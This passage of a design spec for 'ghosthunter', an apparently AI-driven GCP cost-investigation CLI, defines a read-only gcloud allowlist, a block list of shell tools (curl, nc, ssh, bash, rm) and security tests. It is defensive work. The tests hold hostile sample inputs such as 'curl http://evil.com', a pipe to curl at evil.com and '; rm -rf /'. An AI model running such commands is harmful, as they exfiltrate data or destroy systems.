r"^gcloud\s+compute\s+routers\s+list\b",
r"^gcloud\s+compute\s+routers\s+describe\b",
r"^gcloud\s+compute\s+routers\s+get-status\b",
r"^gcloud\s+compute\s+routers\s+get-nat-mapping-info\b",
r"^gcloud\s+compute\s+routers\s+nats\s+describe\b",
r"^gcloud\s+compute\s+routes\s+list\b",
r"^gcloud\s+compute\s+addresses\s+list\b",
r"^gcloud\s+compute\s+forwarding-rules\s+list\b",
r"^gcloud\s+compute\s+backend-services\s+list\b",
r"^gcloud\s+compute\s+backend-services\s+get-health\b",
r"^gcloud\s+compute\s+health-checks\s+list\b",
r"^gcloud\s+compute\s+url-maps\s+list\b",
r"^gcloud\s+compute\s+vpn-gateways\s+list\b",
r"^gcloud\s+compute\s+vpn-tunnels\s+list\b",
```

### GKE
```python
r"^gcloud\s+container\s+clusters\s+list\b",
r"^gcloud\s+container\s+clusters\s+describe\b",
r"^gcloud\s+container\s+node-pools\s+list\b",
r"^gcloud\s+container\s+node-pools\s+describe\b",
r"^gcloud\s+container\s+operations\s+list\b",
r"^gcloud\s+container\s+images\s+list\b",
```

### Cloud Storage (metadata only)
```python
r"^gcloud\s+storage\s+buckets\s+list\b",
r"^gcloud\s+storage\s+buckets\s+describe\b",
r"^gcloud\s+storage\s+ls\b",
r"^gsutil\s+ls\b",
r"^gsutil\s+du\b",
r"^gsutil\s+stat\b",
```

### Cloud SQL
```python
r"^gcloud\s+sql\s+instances\s+list\b",
r"^gcloud\s+sql\s+instances\s+describe\b",
r"^gcloud\s+sql\s+databases\s+list\b",
r"^gcloud\s+sql\s+backups\s+list\b",
r"^gcloud\s+sql\s+operations\s+list\b",
```

### Cloud Functions / Run
```python
r"^gcloud\s+functions\s+list\b",
r"^gcloud\s+functions\s+describe\b",
r"^gcloud\s+functions\s+logs\s+read\b",
r"^gcloud\s+run\s+services\s+list\b",
r"^gcloud\s+run\s+services\s+describe\b",
r"^gcloud\s+run\s+revisions\s+list\b",
```

### Logging
```python
r"^gcloud\s+logging\s+read\b",
r"^gcloud\s+logging\s+logs\s+list\b",
r"^gcloud\s+logging\s+metrics\s+list\b",
r"^gcloud\s+logging\s+metrics\s+describe\b",
r"^gcloud\s+logging\s+sinks\s+list\b",
r"^gcloud\s+logging\s+resource-descriptors\s+list\b",
```

### Monitoring
```python
r"^gcloud\s+monitoring\s+dashboards\s+list\b",
r"^gcloud\s+monitoring\s+dashboards\s+describe\b",
r"^gcloud\s+monitoring\s+metrics\s+list\b",
r"^gcloud\s+monitoring\s+channels\s+list\b",
r"^gcloud\s+monitoring\s+policies\s+list\b",
r"^gcloud\s+monitoring\s+policies\s+describe\b",
```

### DNS
```python
r"^gcloud\s+dns\s+managed-zones\s+list\b",
r"^gcloud\s+dns\s+managed-zones\s+describe\b",
r"^gcloud\s+dns\s+record-sets\s+list\b",
r"^gcloud\s+dns\s+policies\s+list\b",
```

### IAM (read-only)
```python
r"^gcloud\s+iam\s+service-accounts\s+list\b",
r"^gcloud\s+iam\s+service-accounts\s+describe\b",
r"^gcloud\s+iam\s+roles\s+list\b",
r"^gcloud\s+iam\s+roles\s+describe\b",
r"^gcloud\s+projects\s+get-iam-policy\b",
r"^gcloud\s+projects\s+list\b",
r"^gcloud\s+projects\s+describe\b",
```

### Pub/Sub
```python
r"^gcloud\s+pubsub\s+topics\s+list\b",
r"^gcloud\s+pubsub\s+topics\s+describe\b",
r"^gcloud\s+pubsub\s+subscriptions\s+list\b",
r"^gcloud\s+pubsub\s+subscriptions\s+describe\b",
```

### Config
```python
r"^gcloud\s+config\s+list\b",
r"^gcloud\s+config\s+get-value\b",
r"^gcloud\s+auth\s+list\b",
r"^gcloud\s+info\b",
```

## Fast-Reject Patterns (Layer 1)

Layer 1 is a fast-reject for obvious dangerous stuff. It does NOT try to catch all destructive GCP commands — that's the allowlist's job.

```python
FAST_REJECT_PATTERNS = [
    # Shell injection
    r";",              # Command chaining
    r"&&",             # AND chaining
    r"\|\|",           # OR chaining
    
    # Command substitution (but NOT $ alone — gcloud filters use $KEY syntax)
    r"\$\(",           # $(command)
    r"`",              # `command`
    r"\$\{",           # ${variable}
    
    # Redirects — only match when NOT inside quotes
    # These are checked separately with quote-aware logic, not simple regex
    # See validate_redirects() below
    
    # Obvious dangerous commands (not GCP-specific)
    r"\bcurl\b",
    r"\bwget\b",
    r"\bnc\b",
    r"\bnetcat\b",
    r"\bssh\b",
    r"\bscp\b",
    r"\brsync\b",
    r"\brm\b",
    r"\brmdir\b",
    r"\bmkdir\b",
    r"\bchmod\b",
    r"\bchown\b",
    r"\bdd\b",
    r"\bpython\b",
    r"\bpython3\b",
    r"\bnode\b",
    r"\bbash\b",
    r"\bsh\b",
    r"\beval\b",
    
    # Encoding tricks
    r"\\x[0-9a-fA-F]{2}",  # Hex
    r"\\[0-7]{3}",         # Octal
    r"%[0-9a-fA-F]{2}",    # URL encoding
    r"\bbase64\b",
]

def validate_redirects(command: str) -> bool:
    """
    Check for redirect operators (> >> <) outside of quoted strings.
    Returns True if command is safe (no unquoted redirects).
    
    This handles cases like:
    - BLOCKED: gcloud compute instances list > /tmp/out
    - ALLOWED: gcloud logging read --filter="timestamp>'2026-03-01'"
    - ALLOWED: gcloud compute instances list --filter="cpuUtilization>0.8"
    """
    in_single_quote = False
    in_double_quote = False
    i = 0
    
    while i < len(command):
        char = command[i]
        
        # Track quote state
        if char == "'" and not in_double_quote:
            in_single_quote = not in_single_quote
        elif char == '"' and not in_single_quote:
            in_double_quote = not in_double_quote
        
        # Check for redirects only when outside quotes
        elif char in '<>' and not in_single_quote and not in_double_quote:
            return False  # Found unquoted redirect
        
        i += 1
    
    return True  # No unquoted redirects found
```

**What's NOT in fast-reject:**
- GCP destructive verbs like `delete`, `create`, `update` — allowlist handles these
- `$` alone — gcloud `--filter` expressions use `$KEY` syntax legitimately
- `|` alone — pipes are validated by Layer 3 (safe targets only)
- Words like `run`, `set`, `enable` — these appear in legitimate commands
- `>` and `<` inside quotes — these are comparison operators in filter expressions

**The principle:** If you're not sure whether to blocklist something, don't. The allowlist will catch it.

## Safe Pipe Patterns

These pipes ARE allowed after read-only commands:

```python
SAFE_PIPE_PATTERNS = [
    r"\|\s*wc\s+-l",                    # | wc -l
    r"\|\s*wc\b",                        # | wc
    r"\|\s*sort\b",                      # | sort
    r"\|\s*sort\s+-[rn]+\b",            # | sort -rn
    r"\|\s*uniq\b",                      # | uniq
    r"\|\s*uniq\s+-c\b",                # | uniq -c
    r"\|\s*head\s+-?\d+",               # | head -30
    r"\|\s*head\b",                      # | head
    r"\|\s*tail\s+-?\d+",               # | tail -100
    r"\|\s*tail\b",                      # | tail
    r"\|\s*grep\s+['\"]?[^;|&]+['\"]?", # | grep "pattern"
    r"\|\s*grep\s+-[iv]+\b",            # | grep -i
    r"\|\s*tr\s+\[:[a-z]+:\]\s+\[:[a-z]+:\]",  # | tr '[:upper:]' '[:lower:]'
    r"\|\s*cut\b",                       # | cut
    r"\|\s*awk\b",                       # | awk
    r"\|\s*jq\s+['\"][^'\"]+['\"]",     # | jq '.field'
    r"\|\s*jq\s+-r\b",                   # | jq -r
]

BLOCKED_PIPE_TARGETS = [
    r"\|\s*curl\b",
    r"\|\s*wget\b",
    r"\|\s*nc\b",
    r"\|\s*bash\b",
    r"\|\s*sh\b",
    r"\|\s*python\b",
    r"\|\s*xargs\b",
    r"\|\s*tee\b",
    r"\|\s*dd\b",
    r"\|\s*>\s*",
    r"\|\s*mail\b",
]
```

## Testing Requirements

**Security tests are non-negotiable.** See the TDD section in Build Order above for the comprehensive test suite that must be written FIRST.

Additional test files needed:

```python
# test_hypothesis.py
def test_confidence_increases_with_supporting_evidence():
    ...

def test_confidence_decreases_with_refuting_evidence():
    ...

def test_hypothesis_confirmed_at_85_percent():
    ...

def test_hypothesis_eliminated_at_5_percent():
    ...

# test_pipes.py  
def test_all_safe_patterns_compile():
    """Verify regex patterns are valid."""
    ...

def test_blocked_targets_comprehensive():
    """Verify all dangerous pipe targets are blocked."""
    ...
```

## What NOT to Build in v1.0

- AWS provider (v1.1)
- Azure provider (v1.2)
- Autonomous mode (v1.1, with strict guardrails)
- Multi-account support (v2.0 SaaS)
- Scheduled investigations (v1.2)
- Slack/Teams integration (v2.0)

## Dependencies

```toml
[tool.poetry.dependencies]
python = "^3.11"
anthropic = "^0.40.0"
typer = {extras = ["all"], version = "^0.12.0"}
rich = "^13.7.0"
google-cloud-bigquery = "^3.25.0"
google-cloud-logging = "^3.10.0"
pydantic = "^2.7.0"
tomli = "^2.0.0"
tomli-w = "^1.0.0"

[tool.poetry.group.dev.dependencies]
pytest = "^8.0.0"
pytest-asyncio = "^0.23.0"
ruff = "^0.4.0"
```

## Build Order

1. **Security interface + tests first** — Define `validator.is_allowed(command: str) -> ValidationResult`, write comprehensive tests, THEN implement. TDD pays off here because you're codifying your security contract before implementation.
2. **GCP provider** (`providers/gcp.py`) — billing fetch and command execution
3. **Models** (`models/`) — Opus reasoner and Sonnet executor
4. **Hypothesis/Evidence** — data structures and update logic
5. **Investigator** — main loop tying it together
6. **CLI** — user-facing commands
7. **UI** — Rich-based display
8. **Demo** — sample data and mock provider

### Security TDD Approach

```python
# Write these tests FIRST, then implement validator to pass them

# test_security.py
import pytest
from ghosthunter.security.validator import SecurityValidator, ValidationResult

@pytest.fixture
def validator():
    return SecurityValidator()

class TestFastReject:
    """Layer 1: Fast-reject obvious dangerous patterns."""
    
    def test_blocks_semicolon_chaining(self, validator):
        result = validator.is_allowed("gcloud compute instances list; rm -rf /")
        assert not result.allowed
        assert "semicolon" in result.reason.lower()
    
    def test_blocks_curl(self, validator):
        assert not validator.is_allowed("curl http://evil.com").allowed
    
    def test_blocks_command_substitution(self, validator):
        assert not validator.is_allowed("gcloud compute instances list $(whoami)").allowed
    
    def test_allows_dollar_in_filter(self, validator):
        # $KEY in --filter is legitimate gcloud syntax
        cmd = "gcloud compute instances list --filter='labels.env=prod'"
        assert validator.is_allowed(cmd).allowed
    
    def test_blocks_unquoted_redirect(self, validator):
        result = validator.is_allowed("gcloud compute instances list > /tmp/out")
        assert not result.allowed
    
    def test_allows_redirect_inside_quotes(self, validator):
        # > inside filter is a comparison operator, not redirect
        cmd = """gcloud logging read --filter="timestamp>'2026-03-01'" """
        assert validator.is_allowed(cmd).allowed
    
    def test_allows_comparison_in_filter(self, validator):
        # Common pattern: filter by numeric threshold
        cmd = """gcloud compute instances list --filter="cpuUtilization>0.8" """
        assert validator.is_allowed(cmd).allowed

class TestAllowlist:
    """Layer 2: Primary gate — must match allowed pattern."""
    
    def test_allows_instances_list(self, validator):
        assert validator.is_allowed("gcloud compute instances list").allowed
    
    def test_allows_with_format_flag(self, validator):
        assert validator.is_allowed("gcloud compute instances list --format=json").allowed
    
    def test_allows_with_filter_flag(self, validator):
        assert validator.is_allowed("gcloud compute instances list --filter='status=RUNNING'").allowed
    
    def test_blocks_instances_delete(self, validator):
        result = validator.is_allowed("gcloud compute instances delete my-vm")
        assert not result.allowed
        assert "not in allowlist" in result.reason.lower()
    
    def test_allows_cloud_run_list(self, validator):
        # Regression: 'run' was blocked by old blocklist
        assert validator.is_allowed("gcloud run services list").allowed
    
    def test_allows_bq_select(self, validator):
        assert validator.is_allowed("bq query 'SELECT * FROM dataset.table'").allowed
    
    def test_allows_bq_select_with_flags(self, validator):
        assert validator.is_allowed("bq query --format=json --nouse_legacy_sql 'SELECT * FROM t'").allowed
    
    def test_blocks_bq_insert(self, validator):
        assert not validator.is_allowed("bq query 'INSERT INTO t VALUES (1)'").allowed

class TestPipeValidation:
    """Layer 3: Safe pipes only."""
    
    def test_allows_safe_pipes(self, validator):
        assert validator.is_allowed("gcloud logging read 'x' | head -30 | wc -l").allowed
    
    def test_allows_jq_pipe(self, validator):
        assert validator.is_allowed("gcloud compute instances list --format=json | jq '.[]'").allowed
    
    def test_blocks_curl_pipe(self, validator):
        result = validator.is_allowed("gcloud logging read | curl http://evil.com")
        assert not result.allowed
    
    def test_blocks_bash_pipe(self, validator):
        assert not validator.is_allowed("gcloud compute instances list | bash").allowed
    
    def test_blocks_xargs_pipe(self, validator):
        assert not validator.is_allowed("gcloud compute instances list | xargs rm").allowed

class TestEdgeCases:
    """Edge cases and regression tests."""
    
    def test_blocks_encoded_command(self, validator):
        # Hex-encoded 'delete'
        assert not validator.is_allowed("gcloud compute instances \\x64elete vm").allowed
    
    def test_blocks_long_command(self, validator):
        # Commands over 2000 chars are suspicious
        long_cmd = "gcloud compute instances list " + "A" * 2000
        assert not validator.is_allowed(long_cmd).allowed
    
    def test_handles_empty_command(self, validator):
        assert not validator.is_allowed("").allowed
    
    def test_handles_whitespace_only(self, validator):
        assert not validator.is_allowed("   ").allowed
```

## Commands to Remember

```bash
# Run tests
poetry run pytest

# Run specific test file
poetry run pytest tests/test_security.py -v

# Lint
poetry run ruff check src/

# Run CLI during development
poetry run python -m ghosthunter.cli investigate

# Build for distribution
poetry build
```

## Sample Data Structure

### billing.json
```json
{
  "period": {
    "start": "2026-03-01",
    "end": "2026-03-31"
  },
  "services": [
    {
      "name": "Cloud DNS",
      "current_cost": 117000,
      "previous_cost": 12000,
      "change_percent": 847,
      "daily_breakdown": [...]
    },
    {
      "name": "Compute Engine",
      "current_cost": 45000,
      "previous_cost": 36500,
      "change_percent": 23
    },
    {
      "name": "Cloud NAT",
      "current_cost": 8200,
      "previous_cost": 3200,
      "change_percent": 156
    }
  ]
}
```

### logs.json (DNS attack simulation)
```json
{
  "dns_queries": {
    "total_daily": 436000000,
    "normal_baseline": 2000000,
    "top_queried_domains": [
      {"domain": "example.com", "queries": 218000000, "variations": ["ExAmPlE.cOm", "EXAMPLE.com", "eXaMpLe.COM"]},
      {"domain": "api.example.com", "queries": 218000000}
    ],
    "source_resolvers": {
      "8.8.8.8": 0.42,
      "8.8.4.4": 0.31,
      "1.1.1.1": 0.21,
      "internal": 0.06
    },
    "attack_start_date": "2026-03-27",
    "case_variation_detected": true
  }
}
```

### demo_script.json (pre-recorded investigation)
```json
{
  "metadata": {
    "description": "DNS cache bypass attack investigation",
    "total_steps": 8,
    "simulated_duration_seconds": 272
  },
  "steps": [
    {
      "step": 1,
      "delay_seconds": 2,
      "opus_response": {
        "hypotheses": [
          {"id": "H1", "description": "DNS cache bypass attack", "confidence": 60, "status": "active"},
          {"id": "H2", "description": "Misconfigured resolver", "confidence": 25, "status": "active"},
          {"id": "H3", "description": "Legitimate traffic growth", "confidence": 15, "status": "active"}
        ],
        "next_action": {
          "type": "command",
          "command": "gcloud logging read 'resource.type=dns_query' --limit=2000 --format=json",
          "tests_hypothesis": "H1",
          "rationale": "Check query patterns for signs of cache bypass"
        }
      },
      "simulated_command_output": "... 2000 log entries ...",
      "sonnet_compression": "94% of queries from public resolvers (8.8.8.8, 1.1.1.1). Random case variations detected in domain names."
    }
  ]
}
```
